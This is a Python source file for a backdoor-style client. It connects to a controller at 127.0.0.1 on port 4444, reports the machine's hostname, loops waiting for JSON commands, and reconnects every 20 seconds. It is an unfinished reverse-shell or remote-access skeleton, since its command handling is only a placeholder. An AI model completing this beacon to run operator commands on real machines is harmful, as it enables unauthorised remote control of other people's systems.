import socket
import json
import time
import os

HOST = '127.0.0.1'
PORT = 4444

def reliable_send(s, data):
    try:
        json_data = json.dumps(data)
        length = len(json_data)
        length_header = f"{length:<10}".encode()
        s.send(length_header)
        s.send(json_data.encode())
    except Exception as e:
        print(f"Error sending data: {e}")

def reliable_recv(s):
    try:
        length_header = s.recv(10).decode().strip()
        if not length_header:
            return None
        
        length = int(length_header)
        chunks = []
        bytes_received = 0
        
        while bytes_received < length:
            chunk = s.recv(min(length - bytes_received, 4096))
            if not chunk:
                return None
            chunks.append(chunk)
            bytes_received += len(chunk)
        
        data = b''.join(chunks).decode()
        return json.loads(data)
    except Exception as e:
        print(f"Error receiving data: {e}")
        return None

def main():
    while True:
        try:
            # Create socket
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((HOST, PORT))
            
            # Send initial connection info
            reliable_send(s, {
                'type': 'connect',
                'hostname': socket.gethostname()
            })
            
            # Main command loop
            while True:
                command = reliable_recv(s)
                if not command:
                    break
                    
                if command == 'quit':
                    s.close()
                    break
                
                # Handle other commands...
                
        except Exception as e:
            print(f"Connection error: {e}")
            time.sleep(20)
            continue

if __name__ == '__main__':
    main()